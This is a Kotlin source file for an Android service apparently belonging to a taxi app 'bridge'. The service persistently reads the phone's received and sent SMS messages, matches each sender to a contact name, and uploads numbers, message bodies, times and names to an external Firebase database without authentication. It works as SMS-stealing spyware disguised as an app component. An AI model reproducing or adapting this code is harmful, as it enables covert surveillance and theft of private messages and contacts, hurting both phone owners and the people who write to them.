package com.sudataxi.bridgemate

import android.app.*
import android.content.Context
import android.content.Intent
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.os.IBinder
import android.provider.ContactsContract
import android.provider.Telephony
import android.util.Log
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.*

class MyBridgeService : Service() {
    companion object {
        private const val TAG = "SudaBridge"
        private const val DB_URL = "https://sudataxi-bridge-default-rtdb.firebaseio.com"
        fun startService(ctx: Context) {
            val i = Intent(ctx, MyBridgeService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ctx.startForegroundService(i) else ctx.startService(i)
        }
        fun syncSmsInbox(ctx: Context) { MyBridgeService().syncAllSms(ctx) }
    }
    override fun onBind(i: Intent?): IBinder? = null
    override fun onCreate() {
        super.onCreate()
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val ch = NotificationChannel("suda_bridge", "수다택시 브릿지", NotificationManager.IMPORTANCE_LOW)
                getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
            }
            val builder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) Notification.Builder(this, "suda_bridge") else Notification.Builder(this)
            val notif = builder.setContentTitle("수다택시 브릿지 v1.3.30").setContentText("실행 중 - SMS 200건 대기").setSmallIcon(android.R.drawable.stat_notify_sync).build()
            startForeground(1001, notif)
        } catch (e: Exception) {}
        Thread { syncAllSms(this) }.start()
    }
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Thread { syncAllSms(this) }.start()
        return START_STICKY
    }
    private fun getContactName(ctx: Context, num: String): String {
        return try {
            val uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(num))
            val cur = ctx.contentResolver.query(uri, arrayOf(ContactsContract.PhoneLookup.DISPLAY_NAME), null, null, null)
            cur?.use { if (it.moveToFirst()) it.getString(0) ?: "" else "" } ?: ""
        } catch (e: Exception) { "" }
    }
    private fun pushToFirebase(path: String, json: String) {
        try {
            val url = URL("$DB_URL/$path.json")
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "PUT"
            conn.doOutput = true
            conn.setRequestProperty("Content-Type", "application/json")
            conn.connectTimeout = 8000
            conn.readTimeout = 8000
            OutputStreamWriter(conn.outputStream).use { it.write(json) }
            val code = conn.responseCode
            Log.d(TAG, "REST $path -> $code")
            conn.disconnect()
        } catch (e: Exception) {
            Log.e(TAG, "REST fail $path: ${e.message}")
        }
    }

    fun syncAllSms(ctx: Context) {
        Thread {
            try {
                val cr = ctx.contentResolver
                val inboxCur = cr.query(Telephony.Sms.Inbox.CONTENT_URI, null, null, null, "${Telephony.Sms.DATE} DESC")
                val sentCur = cr.query(Telephony.Sms.Sent.CONTENT_URI, null, null, null, "${Telephony.Sms.DATE} DESC")
                val cache = HashMap<String, String>()
                val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault())
                var total = 0

                fun proc(cur: Cursor?, type: String, max: Int) {
                    var cnt = 0
                    cur?.use {
                        val iAddr = it.getColumnIndex(Telephony.Sms.ADDRESS)
                        val iBody = it.getColumnIndex(Telephony.Sms.BODY)
                        val iDate = it.getColumnIndex(Telephony.Sms.DATE)
                        while (it.moveToNext() && cnt < max) {
                            try {
                                val addr = if (iAddr >= 0) it.getString(iAddr) ?: "" else ""
                                val body = if (iBody >= 0) it.getString(iBody) ?: "" else ""
                                if (addr.isBlank() || body.isBlank()) continue
                                val name = cache.getOrPut(addr) { getContactName(ctx, addr) }
                                val date = if (iDate >= 0) it.getLong(iDate) else System.currentTimeMillis()
                                val map = HashMap<String, Any>()
                                map["sender"] = addr
                                map["address"] = addr
                                map["phone"] = addr
                                map["message"] = body.take(500)
                                map["body"] = body.take(500)
                                map["text"] = body.take(500)
                                map["timestamp"] = date.toString()
                                map["date"] = date.toString()
                                map["time"] = sdf.format(Date(date))
                                map["type"] = type
                                map["contactName"] = name
                                map["displayName"] = name
                                map["name"] = name
                                val json = JSONObject(map as Map<*, *>).toString()
                                val key = "${date}_${cnt}_${addr.hashCode()}"
                                pushToFirebase("sudataxi/inbox/sms/$key", json)
                                total++
                                cnt++
                                if (cnt % 20 == 0) Thread.sleep(100)
                            } catch (e: Exception) {}
                        }
                    }
                }
                proc(inboxCur, "received", 100)
                proc(sentCur, "sent", 100)
                pushToFirebase("sudataxi/ping", "\"${System.currentTimeMillis()}\"")
                Log.d(TAG, "완료: $total 건 REST 업로드")
            } catch (e: Exception) {
                Log.e(TAG, "sync error", e)
            }
        }.start()
    }
}